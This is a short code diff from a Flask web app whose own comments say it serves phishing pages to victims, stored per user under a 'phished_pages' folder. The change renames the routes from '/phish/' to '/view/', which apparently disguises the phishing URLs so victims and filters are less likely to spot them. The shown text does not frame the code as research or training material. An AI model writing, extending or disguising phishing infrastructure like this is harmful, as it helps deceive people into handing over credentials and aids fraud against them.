@@ -42,7 +42,7 @@ def status():
 
 
 # Route to serve static files (CSS, JS, images)
-@app.route('/phish/<user_id>/<path:filename>')
+@app.route('/view/<user_id>/<path:filename>')
 def serve_static(user_id, filename):
     base_dir = os.path.abspath(os.path.dirname(__file__))
     folder = os.path.join(base_dir, "phished_pages", user_id)
@@ -51,7 +51,7 @@ def serve_static(user_id, filename):
 
 
 # Route to serve the phishing page to victims
-@app.route('/phish/<user_id>')
+@app.route('/view/<user_id>')
 def serve_phish_page(user_id):
     base_dir = os.path.abspath(os.path.dirname(__file__))
     folder = os.path.join(base_dir, "phished_pages", user_id)
